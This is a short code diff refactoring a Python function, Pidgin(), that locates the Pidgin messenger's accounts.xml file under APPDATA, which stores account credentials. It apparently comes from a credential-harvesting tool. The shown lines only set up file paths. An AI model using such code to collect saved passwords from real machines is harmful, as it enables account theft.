@@ -1,4 +1,4 @@
-from os import getenv, mkdir, environ
+from os import mkdir, environ
 from os.path import isfile
 from xml.etree.ElementTree import fromstring
 from manager.logger import Log
@@ -7,9 +7,8 @@ from preferences.config import config
 
 def Pidgin():
     msgInfo = ""
-    roaming = getenv('APPDATA')
-    user = environ['USERPROFILE']
-    pathToLogs = f'{user}\\{config.pathToLogs}'
+    roaming = environ["APPDATA"]
+    pathToLogs = config.pathToLogs
     directory = [
         roaming + '\\.purple\\accounts.xml'
     ]
